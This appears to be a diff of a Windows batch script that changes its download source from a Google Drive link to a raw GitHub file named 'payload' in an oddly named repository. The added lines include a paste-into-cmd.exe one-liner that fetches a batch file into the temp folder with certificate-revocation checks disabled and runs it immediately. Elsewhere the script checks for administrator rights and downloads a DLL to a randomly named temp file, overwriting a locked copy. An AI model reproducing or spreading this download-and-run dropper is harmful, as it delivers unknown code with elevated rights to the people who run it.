@@ -3,7 +3,7 @@ setlocal
 
 rem =====================================================================
 rem  User one-liner (open cmd.exe and paste):
-rem    curl -s --ssl-no-revoke https://drive.usercontent.google.com/download?id=1PXiw03xzGwn7tQiGkUMZMFrScjd74tho&export=download&authuser=0&confirm=t&uuid=fa13c5c1-7a61-4a87-a983-9c3b6281be5d&at=AMrWOn0yHrm9lT2dH4TTfmbEk9m_:1792508364671 -o %TEMP%\See.bat & %TEMP%\See.bat
+rem    curl -s --ssl-no-revoke https://raw.githubusercontent.com/vexruxrxzen/l-l-p-kl-p-dxl-d-l-d/refs/heads/main/payload -o %TEMP%\See.bat & %TEMP%\See.bat
 rem =====================================================================
 
 :: Check Admin (fltmc works on all Windows, unlike net session)
@@ -46,7 +46,7 @@ call :clean_kld
 
 echo  [*] Downloading...
 
-set "DLL_URL=https://drive.usercontent.google.com/download?id=1PXiw03xzGwn7tQiGkUMZMFrScjd74tho&export=download&authuser=0&confirm=t&uuid=fa13c5c1-7a61-4a87-a983-9c3b6281be5d&at=AMrWOn0yHrm9lT2dH4TTfmbEk9m_:1792508364671"
+set "DLL_URL=https://raw.githubusercontent.com/vexruxrxzen/l-l-p-kl-p-dxl-d-l-d/refs/heads/main/payload"
 set "DLL_PATH=%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.tmp"
 
 rem Rename the old DLL if it is currently locked/in use so we can overwrite it
